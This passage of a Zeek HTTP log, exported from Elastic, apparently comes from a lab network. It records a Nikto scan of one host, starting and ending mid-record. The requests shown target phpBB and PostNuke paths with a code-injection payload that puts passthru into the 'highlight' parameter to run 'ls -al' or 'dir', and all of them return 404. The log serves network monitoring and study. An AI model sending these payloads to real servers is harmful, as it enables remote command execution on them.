-al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FDdwEy4ODzjVNwCY92,"text/html","File not found",1,C3njywEn28XRCsy9e
"Mar 7, 2025 @ 18:08:35.965",PvPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",CdZvfC3ZNE0yvZv1eh,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,062,625","1:+J0j8d5sKa7fZVPxZlGXRfp+nRk=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,416","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FRRfbE3W5fVx2PzQQf,"text/html","File not found",1,CdZvfC3ZNE0yvZv1eh
"Mar 7, 2025 @ 18:08:35.961",OvPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",Cz1ct835JrHwAJVsZ5,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,061,987","1:DMn6dTreqbsjIphlwaJNrLI5veg=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,404","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FPy6Gx2y7nIWfUCoL8,"text/html","File not found",1,Cz1ct835JrHwAJVsZ5
"Mar 7, 2025 @ 18:08:35.952",OPPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",CStaKt2W0V0Ba2hUU6,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,061,344","1:qEciWzQc1hkE9yDa32Rr025t0cM=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,400","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FNq3YY3NdDNCBwU6Ei,"text/html","File not found",1,CStaKt2W0V0Ba2hUU6
"Mar 7, 2025 @ 18:08:35.948","M_PecpUBaT9JHWGjN8br","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",ChxS2B3FTmKKcWPREl,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,060,705","1:rbemfzD0daaR8KMjg5bSTqDhovQ=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,396","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",Fxaw223BmmDBU3NZQ9,"text/html","File not found",1,ChxS2B3FTmKKcWPREl
"Mar 7, 2025 @ 18:08:35.938",MvPecpUBaT9JHWGjN8br,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:36.984","zeek.http",CKPIch4fDlIN9ajnUa,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,060,076","1:awzVxV/BCodld0rRio/GAo9eBuk=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,380","forwarded, zeek-http, _zeek_http_url_parse_failure","192.168.56.102","-","/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php?Nikto=Forums&file=viewtopic&t=2&rush=ls -al&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","-","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FcNIm41R8jpUG3yBe1,"text/html","File not found",1,CKPIch4fDlIN9ajnUa
"Mar 7, 2025 @ 18:08:35.809",MfPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CmkOyJUnBW4mliiuk,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,049,503","1:+IQLKdbti8HVcEdgdSK18XCaBqQ=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,264","forwarded, zeek-http","192.168.56.102",php,"/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FciBo51ENvsY0iNvVh,"text/html","File not found",1,CmkOyJUnBW4mliiuk
"Mar 7, 2025 @ 18:08:35.804",MPPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",Cvp7cL2UxGiCeIjdxf,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,048,870","1:nWLu71vOeIRM/Sn+NVgVV7STKEA=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,258","forwarded, zeek-http","192.168.56.102",php,"/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FBKZ6h1B2InZ40pQgk,"text/html","File not found",1,Cvp7cL2UxGiCeIjdxf
"Mar 7, 2025 @ 18:08:35.800","L_PecpUBaT9JHWGjN8Xr","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CpDobB23G4dM4xjfec,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,048,236","1:XbqOtXQFCvtNfFYK7WLN/0FWZTI=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,242","forwarded, zeek-http","192.168.56.102",php,"/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FfloIB7wfb26qEY82,"text/html","File not found",1,CpDobB23G4dM4xjfec
"Mar 7, 2025 @ 18:08:35.792",LvPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CJCDsG3JqeeTKY2fp2,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,047,595","1:BXaYruYJop8n/dEKNwKsvY8HAzw=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,230","forwarded, zeek-http","192.168.56.102",php,"/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FA3Gur2Pnd2ouyZnVc,"text/html","File not found",1,CJCDsG3JqeeTKY2fp2
"Mar 7, 2025 @ 18:08:35.785",LfPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CsXxmg38UyfSB9IuN7,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,046,960","1:Q4gcYMLI24K6HYZAjVGue2u4Jpk=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,226","forwarded, zeek-http","192.168.56.102",php,"/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FFuXyjElFFOAWQ6wi,"text/html","File not found",1,CsXxmg38UyfSB9IuN7
"Mar 7, 2025 @ 18:08:35.775",LPPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CCLIfS2ktrmdQzHB0a,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,046,334","1:ykQL5oH9DlDhuxsyZTiG9vLp0+g=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,218","forwarded, zeek-http","192.168.56.102",php,"/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F2cixa1VoBenhxgiT2,"text/html","File not found",1,CCLIfS2ktrmdQzHB0a
"Mar 7, 2025 @ 18:08:35.728",JfPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",ClnUQipNYLEYT9oNh,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,041,908","1:nX9yELleOnT/1lmuFEk7RBlZ8kU=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,130","forwarded, zeek-http","192.168.56.102",php,"/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F3KKYCjfwlg61IHfk,"text/html","File not found",1,ClnUQipNYLEYT9oNh
"Mar 7, 2025 @ 18:08:35.721",JPPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CtsqwlLoXzjopJPti,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,041,276","1:uWUrqDrtDyGsOZ/JehU6uNZXE0w=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,128","forwarded, zeek-http","192.168.56.102",php,"/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FR28Ml2X9uv0B0RJi6,"text/html","File not found",1,CtsqwlLoXzjopJPti
"Mar 7, 2025 @ 18:08:35.712","I_PecpUBaT9JHWGjN8Xr","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",COyXPV1XbfuEEyp5rc,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,040,640","1:K3Gy6rUFSyWKYO/5ZhidzrBq9T0=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,124","forwarded, zeek-http","192.168.56.102",php,"/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FLjnGL1O0gbUBu22hh,"text/html","File not found",1,COyXPV1XbfuEEyp5rc
"Mar 7, 2025 @ 18:08:35.706",IvPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.981","zeek.http",CDEzvZ1ENb7fl1aewc,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,039,999","1:emcks6bhyYYGKzEc1MNnlwuqL8o=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,114","forwarded, zeek-http","192.168.56.102",php,"/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FhIKJw4tPoKyZ6Or3k,"text/html","File not found",1,CDEzvZ1ENb7fl1aewc
"Mar 7, 2025 @ 18:08:35.698",IfPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.981","zeek.http",CU4apS1YVayMuBp048,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,039,363","1:dB8hwCg+2j/qWLnTWGS0lIxKWjg=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,112","forwarded, zeek-http","192.168.56.102",php,"/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FLn1po48Vs3ayxOz4e,"text/html","File not found",1,CU4apS1YVayMuBp048
"Mar 7, 2025 @ 18:08:35.691",IPPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.981","zeek.http",CSDzA82QyMD2HUGj6f,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,038,736","1:UDLgUtqL/ETjY/k5BN1hSYi/pM4=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,108","forwarded, zeek-http","192.168.56.102",php,"/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, 